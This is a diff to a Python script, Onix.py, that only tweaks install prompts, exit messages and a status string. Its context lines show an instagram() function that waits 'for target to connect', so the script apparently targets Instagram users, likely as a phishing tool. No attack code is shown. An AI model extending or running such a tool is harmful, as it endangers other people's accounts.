@@ -14,12 +14,12 @@ if os.name == "nt":
         
     except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
-        if install == "y":
+        if install == "y" or install == "Y":
             os.system("pip install -r requirements.txt")
             sleep(0.5)
             pass
         else:
-            exit(Fore.GREEN + "\nhave a good day".title())
+            exit("\nhave a good day".title())
 
 #For linux====================================================================================================
 else:
@@ -29,12 +29,14 @@ else:
         
     except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) ⮞ ")
-        if install == "y":
+        if install == "y" or install == "Y":
+            print("\nIf this option gives you an error try : sudo (Your package installer) python-colorama python-pandas\n")
+            sleep(1)
             os.system("sudo pip install colorama pandas")
             sleep(0.5)
             pass
         else:
-            exit(Fore.GREEN + "\nhave a good day".title())
+            exit("\nhave a good day".title())
         
 #Change Title====================================================================================================
 if os.name == "nt":
@@ -165,7 +167,7 @@ def instagram():
     sleep(0.1)
     linecache.clearcache()
     
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
     
 #Write info====================================================================================================
     try:
@@ -888,7 +890,7 @@ if ask == "xx" or ask == "XX":
     go_back = input(f"\n\r{Fore.YELLOW}[+]{Fore.BLUE} Want To Go Back To Program {Fore.GREEN}(y/n) {Fore.BLUE}: " + Fore.RESET)
     
     if go_back == "y" or go_back == "Y":
-        subprocess.call("python Onix.py" , shell=True)
+        subprocess.call("python Onix.py" , shell=True)  
     elif go_back == "n" or go_back == "N":
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.BLUE}[+]{Fore.GREEN} Have a Good Day""")
